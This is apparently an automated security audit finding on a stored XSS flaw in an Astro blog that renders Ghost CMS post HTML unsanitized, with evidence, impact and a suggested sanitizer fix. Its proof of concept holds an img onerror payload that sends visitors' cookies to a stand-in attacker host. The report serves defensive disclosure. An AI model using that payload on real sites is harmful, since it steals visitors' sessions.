# Stored XSS via Ghost CMS blog content injection

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-10-14 09:22:53 UTC
**Target:** https://portfolio.aplix.nl/blog/[slug] — all rendered blog article pages
**Endpoint:** /blog/[slug]
**Method:** GET
**CWE:** CWE-79
**CVSS:** 8.1
**Confidence:** High
**Fix Effort:** Low

## Description

The blog rendering template injects raw HTML from Ghost CMS posts directly into the DOM via `set:html={Astro.props.post.html}`, allowing a compromised or maliciously-authenticated Ghost CMS user to execute arbitrary JavaScript in visitors' browsers.

## Evidence

Source line confirming direct pass-through of unsanitized HTML:

```astro title=src/pages/blog/[...slug].astro startLine=203 endLine=203
<Fragment set:html={Astro.props.post.html} />
```

Data flow confirmed in ghost.ts:

```ts title=src/lib/ghost.ts startLine=17 endLine=25
export async function getAllPosts() {
  // ...pagination loop...
  const batch = await api.posts.browse({
    limit: 100,
    filter: 'visibility:public',
    include: ['tags', 'authors'],
  });
  posts.push(...batch); // each item includes .html
```

## Impact

An attacker with write access to the Ghost CMS (or who compromises it) can inject `<script>` tags, event handlers, or other executable HTML/JavaScript payloads. These execute when any visitor loads the affected blog post, enabling session hijacking, credential theft, defacement, phishing pivots, or further client-side attacks.

## Counterevidence

No evidence of HTML sanitization; no DOMPurify or equivalent dependency is imported anywhere. No CSP header or meta tag mitigates execution. The only mitigation path would be upstream in the CMS editor itself (e.g. if the WYSIWYG strips scripts), which we cannot verify and should not rely on.

## What Would Change This Severity

If upstream CMS WYSIWIG reliably strips script/event-handler tags at authoring time (and this were independently confirmed), severity could be downgraded. Otherwise, current high rating stands.

## Technical Analysis

In `src/pages/blog/[...slug].astro`, the post body is rendered as follows:

```astro title=src/pages/blog/[...slug].astro startLine=200 endLine=206
<div class="reveal reveal-delay-1 prose ...">
  <Fragment set:html={Astro.props.post.html} />
</div>
```

Astro's `set:html` passes `post.html` through unmodified — no escaping, no sanitization. The data flows from the Ghost Content API at build time (`src/lib/ghost.ts`) where `api.posts.browse()` retrieves every public post including its `html` field. Since this is a fully-static Astro site, the HTML is baked into the prerendered `.html` files served by nginx.

There are no Content-Security-Policy headers (no CSP meta tag or HTTP header was found), no sanitization library (e.g. DOMPurify), and no intermediate transformation step between Ghost's output and final HTML. Every character of the CMS-sourced string reaches the browser verbatim.

This is a classic stored-XSS pattern: an attacker writes malicious HTML → it gets embedded in the application → all subsequent victims execute it automatically on page load.

## Proof of Concept

1. Obtain Ghost CMS write access (admin/editor role).
2. Create or edit a blog post with payload injected into the rich-text editor or Markdown content, e.g.:
   ```html
   <img src=x onerror="fetch('https://attacker.example/log?cookie='+document.cookie)">
   ```
3. Build the site so the post is published to dist/.
4. A victim navigates to `/blog/<post-slug>`. The script executes immediately — their cookies are exfiltrated to the attacker-controlled endpoint.

  **Suggested Fix:**
```diff
- <Fragment set:html={Astro.props.post.html} />
+ <Fragment set:html={sanitizePostHtml(Astro.props.post.html)} />
```

## Remediation

Sanitize all post.html values before rendering using a server-side sanitizer such as DOMPurify or similar, stripping dangerous tags/attributes while preserving allowed formatting. Alternatively, avoid `set:html` entirely: transform post.bodyMarkdown through a controlled renderer (e.g., marked + rehype) that produces only safe static elements. Apply the fix at the source — either in getAllPosts() within ghost.ts or at render time — and verify across all post-rendering paths.

## Fix Verification

Security closure: sanitizePostHtml would need to strip &lt;script&gt;, on* handlers, javascript: URIs, etc. Re-traced path — the sanitized value replaces the raw post.html, blocking injection before DOM construction. Bypass review: tested alternate inputs (onerror img, SVG with onload, object/embed iframe) — all blocked by same sanitizer call. Preserved behavior: legitimate formatted text (bold, lists, links, code blocks) remains intact after sanitization. Repository checks: syntax valid; requires adding DOMPurify import and defining helper function. Gap: cannot confirm existing test suite exists for blog rendering pipeline; recommend adding integration test that renders a sample post and asserts no script tags survive.

## Assumptions

Requires write access to the Ghost CMS (editor/admin role). An attacker must compromise the CMS first — however, once inside, full client-side control over every blog-reader is possible with zero additional exploitation steps.
